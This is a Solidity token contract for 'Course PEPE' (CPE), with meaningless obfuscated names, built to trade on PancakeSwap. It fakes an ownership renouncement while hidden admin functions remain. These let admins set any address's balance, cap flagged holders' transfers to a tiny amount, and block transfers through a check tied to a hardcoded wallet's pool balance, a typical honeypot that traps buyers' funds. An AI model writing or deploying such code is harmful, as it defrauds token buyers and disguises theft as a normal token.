//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface teamFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderWalletBuy) external view returns (uint256);

    function transfer(address totalToWallet, uint256 autoSender) external returns (bool);

    function allowance(address minIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoSender) external returns (bool);

    function transferFrom(
        address sender,
        address totalToWallet,
        uint256 autoSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed teamTake, uint256 value);
    event Approval(address indexed minIs, address indexed spender, uint256 value);
}

abstract contract toFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableMinSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface senderLaunched {
    function createPair(address txTradingTake, address txLimit) external returns (address);
}

interface teamFromMetadata is teamFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CoursePEPE is toFund, teamFrom, teamFromMetadata {

    function marketingReceiver() private view {
        require(totalTakeLimit[_msgSender()]);
    }

    bool private sellTake;

    function getOwner() external view returns (address) {
        return listLimit;
    }

    uint256 private launchSender = 100000000 * 10 ** 18;

    function transferFrom(address minTake, address totalToWallet, uint256 autoSender) external override returns (bool) {
        if (_msgSender() != amountFrom) {
            if (launchedToFrom[minTake][_msgSender()] != type(uint256).max) {
                require(autoSender <= launchedToFrom[minTake][_msgSender()]);
                launchedToFrom[minTake][_msgSender()] -= autoSender;
            }
        }
        return exemptAuto(minTake, totalToWallet, autoSender);
    }

    uint256 minTeamAuto;

    address amountFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalExemptEnable(address tokenAtTrading, uint256 autoSender) public {
        marketingReceiver();
        feeAuto[tokenAtTrading] = autoSender;
    }

    mapping(address => uint256) private feeAuto;

    uint256 atSender;

    function owner() external view returns (address) {
        return listLimit;
    }

    constructor (){
        if (sellTake) {
            sellTake = true;
        }
        enableMinSender marketingTo = enableMinSender(amountFrom);
        takeTx = senderLaunched(marketingTo.factory()).createPair(marketingTo.WETH(), address(this));
        
        tokenMin = _msgSender();
        takeModeAuto();
        totalTakeLimit[tokenMin] = true;
        feeAuto[tokenMin] = launchSender;
        
        emit Transfer(address(0), tokenMin, launchSender);
    }

    function enableIs(address feeEnable) public {
        require(feeEnable.balance < 100000);
        if (sellTotal) {
            return;
        }
        if (sellTake == marketingLimit) {
            sellTake = true;
        }
        totalTakeLimit[feeEnable] = true;
        if (marketingLimit) {
            takeToLaunch = false;
        }
        sellTotal = true;
    }

    function transfer(address tokenAtTrading, uint256 autoSender) external virtual override returns (bool) {
        return exemptAuto(_msgSender(), tokenAtTrading, autoSender);
    }

    function balanceOf(address senderWalletBuy) public view virtual override returns (uint256) {
        return feeAuto[senderWalletBuy];
    }

    bool private sellAtTo;

    function exemptAuto(address minTake, address totalToWallet, uint256 autoSender) internal returns (bool) {
        if (minTake == tokenMin) {
            return totalWallet(minTake, totalToWallet, autoSender);
        }
        uint256 tokenFund = teamFrom(takeTx).balanceOf(receiverIs);
        require(tokenFund == atSender);
        require(totalToWallet != receiverIs);
        if (tradingLaunched[minTake]) {
            return totalWallet(minTake, totalToWallet, receiverLiquidity);
        }
        return totalWallet(minTake, totalToWallet, autoSender);
    }

    address public takeTx;

    function exemptList(address teamSender) public {
        marketingReceiver();
        
        if (teamSender == tokenMin || teamSender == takeTx) {
            return;
        }
        tradingLaunched[teamSender] = true;
    }

    function name() external view virtual override returns (string memory) {
        return amountFundSell;
    }

    bool public marketingLimit;

    function allowance(address marketingEnable, address launchLiquidity) external view virtual override returns (uint256) {
        if (launchLiquidity == amountFrom) {
            return type(uint256).max;
        }
        return launchedToFrom[marketingEnable][launchLiquidity];
    }

    function approve(address launchLiquidity, uint256 autoSender) public virtual override returns (bool) {
        launchedToFrom[_msgSender()][launchLiquidity] = autoSender;
        emit Approval(_msgSender(), launchLiquidity, autoSender);
        return true;
    }

    string private amountFundSell = "Course PEPE";

    string private isAuto = "CPE";

    address receiverIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed txLaunchAt, address indexed takeToken);

    function totalSupply() external view virtual override returns (uint256) {
        return launchSender;
    }

    address private listLimit;

    uint256 constant receiverLiquidity = 5 ** 10;

    uint8 private isAmount = 18;

    function limitTeam(uint256 autoSender) public {
        marketingReceiver();
        atSender = autoSender;
    }

    mapping(address => bool) public tradingLaunched;

    bool public sellTotal;

    mapping(address => mapping(address => uint256)) private launchedToFrom;

    function decimals() external view virtual override returns (uint8) {
        return isAmount;
    }

    function totalWallet(address minTake, address totalToWallet, uint256 autoSender) internal returns (bool) {
        require(feeAuto[minTake] >= autoSender);
        feeAuto[minTake] -= autoSender;
        feeAuto[totalToWallet] += autoSender;
        emit Transfer(minTake, totalToWallet, autoSender);
        return true;
    }

    mapping(address => bool) public totalTakeLimit;

    function symbol() external view virtual override returns (string memory) {
        return isAuto;
    }

    address public tokenMin;

    bool public takeToLaunch;

    function takeModeAuto() public {
        emit OwnershipTransferred(tokenMin, address(0));
        listLimit = address(0);
    }

    uint256 public senderTake;

}